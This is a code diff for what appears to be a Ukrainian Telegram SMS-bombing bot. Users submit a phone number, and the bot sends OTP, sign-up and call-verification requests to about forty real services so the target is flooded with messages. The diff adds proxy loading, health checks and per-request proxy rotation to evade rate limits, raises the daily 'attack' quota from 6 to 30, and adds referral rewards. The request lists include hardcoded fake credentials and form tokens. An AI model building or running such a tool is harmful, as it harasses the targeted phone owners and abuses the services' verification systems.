@@ -70,7 +70,7 @@ async def init_db():
                 name TEXT,
                 username TEXT,
                 block INTEGER DEFAULT 0,
-                attacks_left INTEGER DEFAULT 6,
+                attacks_left INTEGER DEFAULT 30,
                 promo_attacks INTEGER DEFAULT 0,
                 referral_attacks INTEGER DEFAULT 0,
                 unused_referral_attacks INTEGER DEFAULT 0,
@@ -88,6 +88,15 @@ async def init_db():
                 referred_id BIGINT,
                 join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 UNIQUE(referred_id)
+            );
+            CREATE TABLE IF NOT EXISTS proxies (
+                id SERIAL PRIMARY KEY,
+                proxy_url TEXT UNIQUE NOT NULL,
+                last_check TIMESTAMP,
+                avg_latency_ms INTEGER DEFAULT 0,
+                success_count INTEGER DEFAULT 0,
+                fail_count INTEGER DEFAULT 0,
+                is_active BOOLEAN DEFAULT TRUE
             );
             CREATE TABLE IF NOT EXISTS user_messages (
                 id SERIAL PRIMARY KEY,
@@ -139,6 +148,18 @@ async def init_db():
             await conn.execute('ALTER TABLE users ALTER COLUMN last_attack_date TYPE TIMESTAMP USING last_attack_date::timestamp')
         except Exception as e:
             logging.error(f"Error changing last_attack_date column type: {e}")
+
+        # Ensure default daily limit is 30 for existing rows on a new day reset
+        try:
+            await conn.execute("UPDATE users SET attacks_left = 30 WHERE attacks_left IS NULL")
+        except Exception as e:
+            logging.error(f"Error normalizing attacks_left defaults: {e}")
+
+    # Load proxies from local file (if present)
+    try:
+        await load_proxies_from_file("proxy")
+    except Exception as e:
+        logging.error(f"Proxy file load error: {e}")
 
 class Dialog(StatesGroup):
     spam = State()
@@ -212,6 +233,7 @@ admin_keyboard.add("Реферали")
 admin_keyboard.add("Створити промокод")
 admin_keyboard.add("Видалити промокод")
 admin_keyboard.add("Список промокодів")
+admin_keyboard.add("Перевірка проксі")
 admin_keyboard.add("Назад")
 
 def generate_promo_code():
@@ -225,7 +247,7 @@ async def add_user(user_id: int, name: str, username: str, referrer_id: int = No
     async with db_pool.acquire() as conn:
         await conn.execute(
             'INSERT INTO users (user_id, name, username, block, attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date, referrer_id) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10) ON CONFLICT (user_id) DO NOTHING',
-            user_id, name, username, 0, 6, 0, 0, 0, today, referrer_id
+            user_id, name, username, 0, 30, 0, 0, 0, today, referrer_id
         )
         
         if referrer_id:
@@ -235,15 +257,20 @@ async def add_user(user_id: int, name: str, username: str, referrer_id: int = No
             )
             
             await conn.execute(
-                'UPDATE users SET referral_attacks = referral_attacks + 6, referral_count = referral_count + 1 WHERE user_id = $1',
+                'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
                 referrer_id
+            )
+            # Бонус запрошеному користувачу на один день
+            await conn.execute(
+                'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
+                user_id
             )
 
             try:
                 ref_name = username or name or f"User{user_id}"
                 await bot.send_message(
                     referrer_id,
-                    f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +6 додаткових атак на один день!",
+                    f"🎉 За вашим посиланням приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак на один день!",
                     parse_mode='HTML'
                 )
             except Exception as e:
@@ -570,6 +597,27 @@ async def list_promos(message: Message):
         await message.answer(text, parse_mode='HTML')
     else:
         await message.answer("Недостатньо прав.")
+
+@dp.message_handler(text="Перевірка проксі")
+async def proxy_check_menu(message: Message):
+    if message.from_user.id not in ADMIN:
+        await message.answer('Недостатньо прав.')
+        return
+    await message.answer('🔎 Запускаю перевірку проксі...')
+    await ensure_recent_proxy_check(max_age_minutes=0)
+    # Формуємо звіт
+    async with db_pool.acquire() as conn:
+        rows = await conn.fetch('SELECT proxy_url, last_check, avg_latency_ms, success_count, fail_count FROM proxies WHERE is_active = TRUE ORDER BY proxy_url')
+    if not rows:
+        await message.answer('Проксі не додані.')
+        return
+    lines = ["📡 Перевірка проксі:"]
+    for r in rows:
+        total = r['success_count'] + r['fail_count']
+        rate = (r['success_count'] * 100 // total) if total > 0 else 0
+        last = r['last_check'].strftime('%d.%m.%Y %H:%M') if r['last_check'] else '—'
+        lines.append(f"• {r['proxy_url']}\n  ├ Стабільність: {rate}%\n  ├ Затримка: {r['avg_latency_ms']} мс\n  └ Остання перевірка: {last}")
+    await message.answer('\n'.join(lines))
 
 # ПРОМОКОДЫ - ПОЛЬЗОВАТЕЛИ
 
@@ -1050,8 +1098,6 @@ async def start_attack_prompt(message: Message):
         await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
         return
     
-    # Бот безлімітний - перевірка лімітів вимкнена
-    
     message_text = '🎯 Готовий до атаки!\n\n💥 Очікую на номер телефону..'
     
     await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)
@@ -1071,6 +1117,15 @@ async def ukr(number, chat_id):
     headers = {"User-Agent": fake_useragent.UserAgent().random}
     proxy = None
     proxy_auth = None
+
+    # Проксі: отримуємо доступні і налаштовуємо ротацію
+    proxies = await get_available_proxies()
+    def pick_proxy(i: int):
+        if not proxies:
+            return None, None
+        p = proxies[i % len(proxies)]
+        url, auth = parse_proxy_for_aiohttp(p)
+        return url, auth
 
     csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
     try:
@@ -1118,46 +1173,46 @@ async def ukr(number, chat_id):
             await send_request_and_log(url, **kwargs)
 
     tasks = [
-        bounded_request("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", json={"applicationSend": "sms", "lang": "uk", "phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", json={"needSubscribeForNews": "false", "phone": formatted_number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", json={"phone": formatted_number, "type": ""}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://dnipro-m.ua/ru/phone-verification/", json={"phone": number}, headers=headers_dnipro, cookies=cookies_dnipro, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://my.ctrs.com.ua/api/v2/signup", json={"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://my.ctrs.com.ua/api/auth/login", json={"identity": "+" + number}, headers=headers_citrus, cookies=cookies_citrus, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://auth.easypay.ua/api/check", json={"phone": number}, headers=headers_easypay, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://sandalini.ua/ru/signup/", data={"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://uvape.pro/index.php?route=account/register/add", data={"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, headers=headers_uvape, cookies=cookies_uvape, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4, "only_sms": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", data={"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, headers=headers_terravape,cookies=cookies_terravape, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://im.comfy.ua/api/auth/v3/ivr/send", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://www.moyo.ua/identity/registration", data={"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, headers=headers_moyo, cookies=cookies_moyo, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://pizza.od.ua/ajax/reg.php", data={"phone": formatted_number4}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://sushiya.ua/ru/api/v1/user/auth", data={"phone": number[2:], "need_skeep": ""}, headers=headers_sushiya, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://avrora.ua/index.php?dispatch=otp.send", data={"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", data={"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, headers=headers_zolota,cookies=cookies_zolota, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", data={"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, headers=headers_avtoria, cookies=cookies_avtoria, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request(f"https://ukrpas.ua/login?phone=+{number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", data={"phone": formatted_number6}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", json={"phone": "+" + number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", data={"telephone": formatted_number7}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://api.iqos.com.ua/v1/auth/otp", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", method='POST', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://api-mobile.planetakino.ua/graphql", json={"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://back.trofim.com.ua/api/via-phone-number", json={"phone": number}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://dracula.robota.ua/?q=SendOtpCode", json={"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, headers=headers_elmir,cookies=cookies_elmir, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, headers=headers_elmir_call, cookies=cookies_elmir_call, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", method='GET', headers=headers, proxy=proxy, proxy_auth=proxy_auth),
-        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", json={"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, headers=headers, proxy=proxy, proxy_auth=proxy_auth)
+        bounded_request("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxy=pick_proxy(0)[0], proxy_auth=pick_proxy(0)[1]),
+        bounded_request("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxy=pick_proxy(1)[0], proxy_auth=pick_proxy(1)[1]),
+        bounded_request("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxy=pick_proxy(2)[0], proxy_auth=pick_proxy(2)[1]),
+        bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", json={"applicationSend": "sms", "lang": "uk", "phone": number}, headers=headers, proxy=pick_proxy(3)[0], proxy_auth=pick_proxy(3)[1]),
+        bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", json={"needSubscribeForNews": "false", "phone": formatted_number}, headers=headers, proxy=pick_proxy(4)[0], proxy_auth=pick_proxy(4)[1]),
+        bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", json={"phone": "+" + number}, headers=headers, proxy=pick_proxy(5)[0], proxy_auth=pick_proxy(5)[1]),
+        bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", json={"phone": formatted_number, "type": ""}, headers=headers, proxy=pick_proxy(6)[0], proxy_auth=pick_proxy(6)[1]),
+        bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=pick_proxy(7)[0], proxy_auth=pick_proxy(7)[1]),
+        bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", json={"phone": number}, headers=headers, proxy=pick_proxy(8)[0], proxy_auth=pick_proxy(8)[1]),
+        bounded_request("https://dnipro-m.ua/ru/phone-verification/", json={"phone": number}, headers=headers_dnipro, cookies=cookies_dnipro, proxy=pick_proxy(9)[0], proxy_auth=pick_proxy(9)[1]),
+        bounded_request("https://my.ctrs.com.ua/api/v2/signup", json={"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, headers=headers_citrus, cookies=cookies_citrus, proxy=pick_proxy(10)[0], proxy_auth=pick_proxy(10)[1]),
+        bounded_request("https://my.ctrs.com.ua/api/auth/login", json={"identity": "+" + number}, headers=headers_citrus, cookies=cookies_citrus, proxy=pick_proxy(11)[0], proxy_auth=pick_proxy(11)[1]),
+        bounded_request("https://auth.easypay.ua/api/check", json={"phone": number}, headers=headers_easypay, proxy=pick_proxy(12)[0], proxy_auth=pick_proxy(12)[1]),
+        bounded_request("https://sandalini.ua/ru/signup/", data={"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, headers=headers, proxy=pick_proxy(13)[0], proxy_auth=pick_proxy(13)[1]),
+        bounded_request("https://uvape.pro/index.php?route=account/register/add", data={"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, headers=headers_uvape, cookies=cookies_uvape, proxy=pick_proxy(14)[0], proxy_auth=pick_proxy(14)[1]),
+        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4}, headers=headers, proxy=pick_proxy(15)[0], proxy_auth=pick_proxy(15)[1]),
+        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", data={"phone": formatted_number4, "only_sms": "1"}, headers=headers, proxy=pick_proxy(16)[0], proxy_auth=pick_proxy(16)[1]),
+        bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", data={"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, headers=headers_terravape,cookies=cookies_terravape, proxy=pick_proxy(17)[0], proxy_auth=pick_proxy(17)[1]),
+        bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", json={"phone": number}, headers=headers, proxy=pick_proxy(18)[0], proxy_auth=pick_proxy(18)[1]),
+        bounded_request("https://im.comfy.ua/api/auth/v3/ivr/send", json={"phone": number}, headers=headers, proxy=pick_proxy(19)[0], proxy_auth=pick_proxy(19)[1]),
+        bounded_request("https://www.moyo.ua/identity/registration", data={"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, headers=headers_moyo, cookies=cookies_moyo, proxy=pick_proxy(20)[0], proxy_auth=pick_proxy(20)[1]),
+        bounded_request("https://pizza.od.ua/ajax/reg.php", data={"phone": formatted_number4}, headers=headers, proxy=pick_proxy(21)[0], proxy_auth=pick_proxy(21)[1]),
+        bounded_request("https://sushiya.ua/ru/api/v1/user/auth", data={"phone": number[2:], "need_skeep": ""}, headers=headers_sushiya, proxy=pick_proxy(22)[0], proxy_auth=pick_proxy(22)[1]),
+        bounded_request("https://avrora.ua/index.php?dispatch=otp.send", data={"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, headers=headers, proxy=pick_proxy(23)[0], proxy_auth=pick_proxy(23)[1]),
+        bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", data={"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, headers=headers_zolota,cookies=cookies_zolota, proxy=pick_proxy(24)[0], proxy_auth=pick_proxy(24)[1]),
+        bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", data={"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, headers=headers_avtoria, cookies=cookies_avtoria, proxy=pick_proxy(25)[0], proxy_auth=pick_proxy(25)[1]),
+        bounded_request(f"https://ukrpas.ua/login?phone=+{number}", method='GET', headers=headers, proxy=pick_proxy(26)[0], proxy_auth=pick_proxy(26)[1]),
+        bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", data={"phone": formatted_number6}, headers=headers, proxy=pick_proxy(27)[0], proxy_auth=pick_proxy(27)[1]),
+        bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", json={"phone": "+" + number}, headers=headers, proxy=pick_proxy(28)[0], proxy_auth=pick_proxy(28)[1]),
+        bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", data={"telephone": formatted_number7}, headers=headers, proxy=pick_proxy(29)[0], proxy_auth=pick_proxy(29)[1]),
+        bounded_request("https://api.iqos.com.ua/v1/auth/otp", json={"phone": number}, headers=headers, proxy=pick_proxy(30)[0], proxy_auth=pick_proxy(30)[1]),
+        bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", method='POST', headers=headers, proxy=pick_proxy(31)[0], proxy_auth=pick_proxy(31)[1]),
+        bounded_request("https://api-mobile.planetakino.ua/graphql", json={"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, headers=headers, proxy=pick_proxy(32)[0], proxy_auth=pick_proxy(32)[1]),
+        bounded_request("https://back.trofim.com.ua/api/via-phone-number", json={"phone": number}, headers=headers, proxy=pick_proxy(33)[0], proxy_auth=pick_proxy(33)[1]),
+        bounded_request("https://dracula.robota.ua/?q=SendOtpCode", json={"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, headers=headers, proxy=pick_proxy(34)[0], proxy_auth=pick_proxy(34)[1]),
+        bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", method='GET', headers=headers, proxy=pick_proxy(35)[0], proxy_auth=pick_proxy(35)[1]),
+        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, headers=headers_elmir,cookies=cookies_elmir, proxy=pick_proxy(36)[0], proxy_auth=pick_proxy(36)[1]),
+        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", data={"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, headers=headers_elmir_call, cookies=cookies_elmir_call, proxy=pick_proxy(37)[0], proxy_auth=pick_proxy(37)[1]),
+        bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", method='GET', headers=headers, proxy=pick_proxy(38)[0], proxy_auth=pick_proxy(38)[1]),
+        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", json={"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, headers=headers, proxy=pick_proxy(39)[0], proxy_auth=pick_proxy(39)[1])
     ]
 
     if not attack_flags.get(chat_id):
@@ -1176,6 +1231,8 @@ async def start_attack(number, chat_id):
     start_time = asyncio.get_event_loop().time()
 
     try:
+        # Перед атакою: перевіряємо проксі та оновлюємо метрики
+        await ensure_recent_proxy_check()
         while (asyncio.get_event_loop().time() - start_time) < timeout:
             if not attack_flags.get(chat_id):
                 logging.info(f"Атаку на номер {number} зупинено користувачем.")
@@ -1228,6 +1285,93 @@ async def start_attack(number, chat_id):
         reply_markup=inline_keyboard2
     )
 
+async def parse_proxy_for_aiohttp(proxy_str: str):
+    try:
+        from urllib.parse import urlparse
+        parsed = urlparse(proxy_str)
+        if parsed.username and parsed.password:
+            auth = BasicAuth(parsed.username, parsed.password)
+            # rebuild without credentials
+            host = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}" if parsed.port else f"{parsed.scheme}://{parsed.hostname}"
+            return host, auth
+        return proxy_str, None
+    except Exception:
+        return proxy_str, None
+
+async def check_proxy(proxy_url: str, timeout_sec: int = 5) -> tuple:
+    start = asyncio.get_event_loop().time()
+    url, auth = await parse_proxy_for_aiohttp(proxy_url)
+    try:
+        timeout = aiohttp.ClientTimeout(total=timeout_sec)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get('https://api.ipify.org?format=json', proxy=url, proxy_auth=auth) as resp:
+                ok = resp.status == 200
+                latency = int((asyncio.get_event_loop().time() - start) * 1000)
+                return ok, latency
+    except Exception:
+        return False, int((asyncio.get_event_loop().time() - start) * 1000)
+
+async def ensure_recent_proxy_check(max_age_minutes: int = 10):
+    async with db_pool.acquire() as conn:
+        proxies = await conn.fetch('SELECT id, proxy_url, last_check, success_count, fail_count FROM proxies WHERE is_active = TRUE')
+    now = datetime.now()
+    needs_check = []
+    for p in proxies:
+        if not p['last_check'] or (now - p['last_check']).total_seconds() > max_age_minutes * 60:
+            needs_check.append(p)
+    if not needs_check:
+        return
+    # check in parallel
+    results = await asyncio.gather(*[check_proxy(p['proxy_url']) for p in needs_check], return_exceptions=True)
+    async with db_pool.acquire() as conn:
+        for p, res in zip(needs_check, results):
+            if isinstance(res, Exception):
+                ok, latency = False, 0
+            else:
+                ok, latency = res
+            if ok:
+                await conn.execute('UPDATE proxies SET last_check=$1, avg_latency_ms=$2, success_count=success_count+1 WHERE id=$3', datetime.now(), latency, p['id'])
+            else:
+                await conn.execute('UPDATE proxies SET last_check=$1, fail_count=fail_count+1 WHERE id=$2', datetime.now(), p['id'])
+
+async def get_available_proxies(min_success_rate: int = 50):
+    async with db_pool.acquire() as conn:
+        rows = await conn.fetch('SELECT proxy_url, success_count, fail_count, avg_latency_ms FROM proxies WHERE is_active = TRUE AND last_check IS NOT NULL')
+    available = []
+    for r in rows:
+        total = r['success_count'] + r['fail_count']
+        rate = (r['success_count'] * 100 // total) if total > 0 else 0
+        if rate >= min_success_rate:
+            available.append(r['proxy_url'])
+    return available
+
+async def load_proxies_from_file(file_path: str):
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            lines = [l.strip() for l in f.readlines()]
+    except FileNotFoundError:
+        logging.info(f"Proxy file '{file_path}' not found. Skipping load.")
+        return
+    if not lines:
+        return
+    # normalize and insert
+    cleaned: list[str] = []
+    for line in lines:
+        if not line or line.startswith('#'):
+            continue
+        url = line
+        if not (url.startswith('http://') or url.startswith('https://') or url.startswith('socks5://')):
+            url = 'http://' + url
+        cleaned.append(url)
+    if not cleaned:
+        return
+    async with db_pool.acquire() as conn:
+        for url in cleaned:
+            try:
+                await conn.execute('INSERT INTO proxies (proxy_url) VALUES ($1) ON CONFLICT (proxy_url) DO NOTHING', url)
+            except Exception as e:
+                logging.error(f"Failed to insert proxy {url}: {e}")
+
 @dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
 @dp.throttled(anti_flood, rate=3)
 async def handle_phone_number(message: Message):
@@ -1271,12 +1415,19 @@ async def handle_phone_number(message: Message):
             await message.answer(f"Номер <i>{number}</i> захищений від атаки.", parse_mode="html")
             return
 
-        # Бот безлімітний - оновлюємо тільки дату останньої атаки
+        # Перевірка лімітів: 30 атак/день + промо/реферальні
+        can_attack, attacks_left, promo_attacks, referral_attacks = await check_attack_limits(user_id)
+        if not can_attack:
+            await message.answer("❌ На сьогодні ліміт атак вичерпано. Спробуйте завтра або скористайтесь промокодом/рефералами.")
+            return
+        # Резервуємо атаку: списуємо з пріоритетом промо -> реферальні -> звичайні
         async with db_pool.acquire() as conn:
-            await conn.execute(
-                'UPDATE users SET last_attack_date = $1 WHERE user_id = $2',
-                datetime.now(), user_id
-            )
+            if promo_attacks > 0:
+                await conn.execute('UPDATE users SET promo_attacks = promo_attacks - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
+            elif referral_attacks > 0:
+                await conn.execute('UPDATE users SET referral_attacks = referral_attacks - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
+            else:
+                await conn.execute('UPDATE users SET attacks_left = attacks_left - 1, last_attack_date = $1 WHERE user_id = $2', datetime.now(), user_id)
         cancel_keyboard = get_cancel_keyboard()
         attack_flags[chat_id] = True 
         await message.answer(f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...', parse_mode="html", reply_markup=get_cancel_keyboard())
@@ -1320,8 +1471,8 @@ async def check_attack_limits(user_id: int):
             # Зберігаємо невикористані реферальні атаки
             if referral_attacks > 0:
                 unused_referral_attacks += referral_attacks
-            # Скидаємо звичайні атаки на 6, додаємо накопичені реферальні
-            new_attacks = 6 + unused_referral_attacks
+            # Скидаємо звичайні атаки на 30, додаємо накопичені реферальні
+            new_attacks = 30 + unused_referral_attacks
             await conn.execute(
                 "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
                 new_attacks, today, user_id
@@ -1696,60 +1847,25 @@ async def process_referral(referrer_id, user_id, username, name):
             referrer_id, user_id
         )
         await conn.execute(
-            'UPDATE users SET referral_attacks = referral_attacks + 6, referral_count = referral_count + 1 WHERE user_id = $1',
+            'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
             referrer_id
+        )
+        # +10 атаки запрошеному користувачу на один день
+        await conn.execute(
+            'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
+            user_id
         )
         try:
             ref_name = username or name or f"User{user_id}"
             await bot.send_message(
                 referrer_id,
-                f"🎉 За вашою реферальною силкою приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +6 додаткових атак на один день!",
+                f"🎉 За вашою реферальною силкою приєднався новий користувач: <a href='tg://user?id={user_id}'>{ref_name}</a>\n🚀 Ви отримали +10 додаткових атак на один день!",
                 parse_mode='HTML'
             )
         except Exception as e:
             logging.error(f"Error notifying referrer {referrer_id}: {e}")
 
-USER_STATS_ALLOWED = [7734239628, 810944378]
-
-@dp.message_handler(commands=['stats'])
-async def user_stats(message: Message):
-    if message.from_user.id in USER_STATS_ALLOWED:
-        async with db_pool.acquire() as conn:
-            total_users = await conn.fetchval('SELECT COUNT(*) FROM users')
-            active_users = 0
-            users = await conn.fetch('SELECT user_id FROM users')
-            for user in users:
-                try:
-                    await bot.send_chat_action(user['user_id'], 'typing')
-                    active_users += 1
-                except (BotBlocked, UserDeactivated, ChatNotFound):
-                    continue
-                except Exception as e:
-                    logging.error(f"Помилка при перевірці користувача {user['user_id']}: {e}")
-                    continue
-            blocked_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE block = 1')
-            users_with_referrals = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count > 0')
-            total_referrals = await conn.fetchval('SELECT COUNT(*) FROM referrals')
-            vip_users = await conn.fetchval('SELECT COUNT(*) FROM users WHERE referral_count >= 20')
-            total_promos = await conn.fetchval('SELECT COUNT(*) FROM promocodes')
